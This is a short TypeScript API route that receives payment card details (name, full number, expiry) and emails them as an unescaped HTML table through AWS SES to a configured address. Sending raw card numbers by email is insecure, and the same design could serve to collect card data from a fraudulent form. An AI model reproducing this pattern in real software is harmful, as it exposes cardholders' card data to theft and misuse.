import nodemailer from 'nodemailer';

// Create a Nodemailer transporter using SMTP
const transporter = nodemailer.createTransport({
    host: "email-smtp.us-east-1.amazonaws.com", // Replace with your AWS SES SMTP endpoint
    port: 587, // Use port 587 or 465
    secure: false, // true for 465, false for other ports
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
    },
});


export async function POST(req: Request) {

    const body = await req.json() as {
        name: string;
        refNumber: string;
        cardNumber: string;
        cardName: string;
        secretKey: string;
        cardExpirationMonth: string;
        cardExpirationYear: string;
    };

    const mailOptions = {
        from: process.env.EMAIL_FROM_VERIFIED,
        to: process.env.EMAIL_TO_ANY,
        subject: `CC Web - Ref: ${body.refNumber}`,
        html: `
        <html lang="en">
        <head>
            <style>
                table {
                    font-family: Arial, sans-serif;
                    border-collapse: collapse;
                    width: 100%;
                }

                th {
                    background-color: #f2f2f2;
                }

                th,
                td {
                    border: 1px solid #dddddd;
                    text-align: left;
                    padding: 8px;
                }

                tr:nth-child(even) {
                    background-color: #f2f2f2;
                }
            </style><title></title>
        </head>
        <body>
            <h4>Card Details</h4>
            <p><b>Booking Ref: ${body.refNumber}</b></p>
            <table>
                <tr>
                    <td>Card Name</td>
                    <td>${body.cardName}</td>
                </tr>
                <tr>
                    <td>Card Number</td>
                    <td>${body.cardNumber}</td>
                </tr>
                <tr>
                    <td>Card Expiration (MM/YY)</td>
                    <td>${body.cardExpirationMonth}/${body.cardExpirationYear}</td>
                </tr>
            </table>
        </body>
        </html>
    `,
    };

    try {
        const info = await transporter.sendMail(mailOptions);
        console.log("Email sent successfully:", info.messageId);
        return Response.json({
            status: 'success',
        }, {
            status: 200,
        });
    } catch (error) {
        console.error("Error sending email:", error);
        return Response.json({
            status: 'error',
        }, {
            status: 500,
        });
    }


}
